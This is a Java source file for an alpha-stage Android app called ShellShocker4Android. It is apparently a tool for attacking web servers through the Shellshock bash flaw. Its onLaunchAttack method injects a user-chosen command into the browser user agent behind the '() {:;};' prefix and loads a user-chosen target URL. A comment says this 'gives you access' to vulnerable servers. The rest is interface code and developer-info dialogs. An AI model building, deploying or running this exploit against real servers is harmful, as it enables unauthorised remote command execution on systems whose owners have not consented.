package it.stefanobelli.shellshocker;

/**
 * Stefano Belli
 *
 * GitHub: <https://github.com/StefanoBelli>
 * EMail: <stefano9913@gmail.com>
 * Google+: <http://plus.google.com/+StefanoBelli>
 * WebSite: <http://www.inthebit.it>
 *
 * <(C) Copyleft, you can share this code modify and redistribuite.
 *
 * src/it/stefanobelli/shellshocker/MainActivity.java
 *
 * ShellShocker4Android
 *
 * Status: ALPHA
 * Version: 0.2rev1
 *
 * [AndroidManifest.xml for more info(s)]
 */

import android.app.AlertDialog;
import android.app.Dialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.widget.TextView;
import android.widget.Toast;
import android.util.Log;


public class MainActivity extends ActionBarActivity {

    Bundle state;
    EditText getTarget;
    EditText getTargetCommand;
    TextView showConfirmTarget;
    TextView showConfirmCommand;
    Button confirm;
    Button launch;
    WebView webBr;
    String targetString;
    String commandString;
    WebSettings settingsBrowser;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //Define widgets
        getTarget = (EditText)findViewById(R.id.typeTargetEText);
        getTargetCommand = (EditText)findViewById(R.id.typeCommandEdit);
        confirm = (Button)findViewById(R.id.checkAll);
        launch = (Button)findViewById(R.id.launch_btn_attack);
        webBr = (WebView)findViewById(R.id.browser);
        showConfirmCommand = (TextView)findViewById(R.id.showcommand);
        showConfirmTarget = (TextView)findViewById(R.id.showtarget);
        //Browser, to finish
        settingsBrowser = webBr.getSettings();
        webBr.setWebViewClient(new WebViewClient());
        launch.setEnabled(false);
	Log.v("onCreate", "Activity created");

    }

    public void onGetString(View v){
        /**Get from edittext and convert to String */
        targetString = getTarget.getText().toString();
        commandString = getTargetCommand.getText().toString();
	Log.v("onGetString", "I g0t Strings, need to check it");
        showConfirmTarget.setText("Server target: "+targetString);
        showConfirmCommand.setText("Command: "+commandString);
        //Check if Strings are empty or not
        if (!targetString.isEmpty() && !commandString.isEmpty()){
            launch.setEnabled(true);
            getTarget.setEnabled(false);
            getTargetCommand.setEnabled(false);
	    Log.v("onGetString", "Ready");
        } else{
            launch.setEnabled(false);
            getTarget.setEnabled(true);
            getTargetCommand.setEnabled(true);
            Toast t = Toast.makeText(this, "Check fields.", Toast.LENGTH_SHORT);
	    Log.v("onGetString", "Check fields.");
            t.show();
        }
    }

    public void onLaunchAttack(View v){
        /**Launch attack
         *
         * Be sure target is VULNERABLE
         * This app no return anything.
         * it says you when server comes called
         * and it gives you access
         */
         Toast t = Toast.makeText(this, "Calling: "+targetString, Toast.LENGTH_LONG);
         t.show();
         settingsBrowser.setUserAgentString("() {:;}; "+commandString);
         webBr.loadUrl(targetString);
	 Log.v("onLaunchAttack", "launched...");
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_warningInfo) {
            Intent warningAboutApp = new Intent(this, WarningActivity.class);
            startActivity(warningAboutApp);
	    Log.v("MenuListener(onOptionsItemSelected)", "action_warningInfo:launched");
            return true;
        } else if (id == R.id.action_infoDev){
            getDeveloperInfo(state);
	    Log.v("MenuListener(onOptionsItemSelected)", "action_infoDev:launched");
            return true;
        } else if (id == R.id.action_infoAppStatus){
            getApplicationInfo(state);
	    Log.v("MenuListener(onOptionsItemSelected", "action_infoAppStatus:launched");
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    public Dialog getDeveloperInfo(Bundle bundle){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Developer Info");
        builder.setMessage("Hi, my name is Stefano Belli, i am an Android developer from 2-3 months, so this is my first app. I know that is not too exiting... I also know: Python, C, C++, Java. Where you can find me? GMail: stefano9913@gmail.com");
        builder.setPositiveButton("Open Source", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                openSource(state);
            }
        });
        builder.setNeutralButton("OK", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                //Do Nothing.
            }
        });
        builder.show();
        return builder.create();
    }

    public Dialog openSource(Bundle bundle){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Open Source Software");
        builder.setMessage("This software is 'Copyleft', you can share it, redistribuide, do what you want.");
        builder.setMessage("Sources Hosted on: GitHub (https://github.com/StefanoBelli/shellshocker-android)");
        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                //Do nothing
            }
        });

        builder.show();
        return builder.create();
    }

    public Dialog getApplicationInfo(Bundle bundle){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Application Info");
        builder.setMessage("Status: ALPHA - Version 0.2rev1");
        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {

            }
        });

        builder.show();
        return builder.create();
    }

}
